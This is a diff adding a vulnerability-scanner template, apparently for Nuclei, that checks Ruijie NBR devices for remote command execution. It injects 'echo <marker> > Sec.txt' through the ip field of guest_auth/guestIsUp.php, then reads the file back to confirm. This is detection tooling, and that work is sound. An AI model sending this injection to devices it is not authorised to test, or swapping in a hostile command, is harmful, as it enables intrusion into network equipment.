@@ -1,0 +1,26 @@
+id: Ruijie_NBR_guestIsUp_RCE
+
+info:
+  name: Ruijie_NBR_guestIsUp_RCE
+  author: pitaya
+  severity: high
+
+requests:
+  - raw:
+      - |              
+        POST /guest_auth/guestIsUp.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+
+        mac=1&ip=127.0.0.1|echo e15adba0f7cf791b  > Sec.txt
+      
+      - |
+        GET /guest_auth/Sec.txt HTTP/1.1
+        Host: {{Hostname}}
+           
+    matchers:
+      - type: word
+        words:
+          - "e15adba0f7cf791b"
